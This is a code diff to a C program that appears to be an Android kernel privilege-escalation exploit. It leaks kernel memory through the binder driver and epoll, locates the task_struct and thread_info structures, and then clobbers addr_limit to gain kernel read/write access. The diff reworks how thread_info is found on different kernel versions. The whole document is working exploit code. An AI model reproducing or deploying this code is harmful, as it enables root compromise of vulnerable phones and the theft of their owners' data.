@@ -295,7 +295,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
 
 int leak_data(void *leakBuffer, int leakAmount,
                unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
-               unsigned long *task_struct_ptr_p, unsigned long *kstack_p)
+               unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p)
 {
     unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
     unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
@@ -387,7 +387,7 @@ int leak_data(void *leakBuffer, int leakAmount,
         memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
         message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);
 
-        if (!badPointer && (extraLeakAmount > 0 || kstack_p != NULL))
+        if (!badPointer && (extraLeakAmount > 0 || task_struct_plus_8_p != NULL))
         {
             unsigned long extra[6] = {
                 addr,
@@ -421,11 +421,11 @@ int leak_data(void *leakBuffer, int leakAmount,
             write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
             //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
         }
-        if (kstack_p != NULL)
+        if (task_struct_plus_8_p != NULL)
         {
             if (read(pipefd[0], dataBuffer, 8) != 8) {
                 childSuccess = 0;
-                error( "leaking kstack");
+                error( "leaking second field of task_struct");
             }
             message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
             write(leakPipe[1], dataBuffer, 8);
@@ -478,10 +478,10 @@ int leak_data(void *leakBuffer, int leakAmount,
         }
     }
 
-    if (kstack_p != NULL)
+    if (task_struct_plus_8_p != NULL)
     {
-        if (read(leakPipe[0], kstack_p, 8) != 8) {
-            message( "PARENT: **fail** reading leaked kstack");
+        if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
+            message( "PARENT: **fail** reading leaked task_struct at offset 8");
             success = 0;
             goto DONE;
         }
@@ -517,9 +517,9 @@ DONE:
 
 int leak_data_retry(void *leakBuffer, int leakAmount,
                unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
-               unsigned long *task_struct_ptr_p, unsigned long *kstack_p) {
+               unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p) {
     int try = 0;
-    while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, kstack_p)) {
+    while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, task_struct_plus_8_p)) {
         message("MAIN: **fail** retrying");
         try++;
     }
@@ -1264,28 +1264,27 @@ int main(int argc, char **argv)
     binder_fd = open("/dev/binder", O_RDONLY);
     epfd = epoll_create(1000);
 
-    unsigned long kstack = 0xDEADBEEFDEADBEEFul;
+    unsigned long task_struct_plus_8 = 0xDEADBEEFDEADBEEFul;
     unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
 
-    // TODO: kstack is invalid on kernel 4
-    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
+    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &task_struct_plus_8)) {
         error("Failed to leak data");
     }
 
     unsigned long thread_info_ptr;
     
-    if (kernel3) {
-        thread_info_ptr = find_thread_info_ptr_kernel3(kstack);
-        if (thread_info_ptr == 0)
-            error("Cannot find thread_info_ptr");
+    if (task_struct_plus_8 == USER_DS) {
+        message("MAIN: thread_info is in task_struct");
+        thread_info_ptr = task_struct_ptr;
     }
     else {
-        thread_info_ptr = task_struct_ptr;
+        message("MAIN: thread_info should be in stack");
+        thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
+        if (thread_info_ptr  == 0)
+            error("cannot find thread_info on kernel stack");
     }
     
     message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
-    if (kernel3) 
-        message("MAIN: stack = %lx", kstack);
     message("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
     message("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
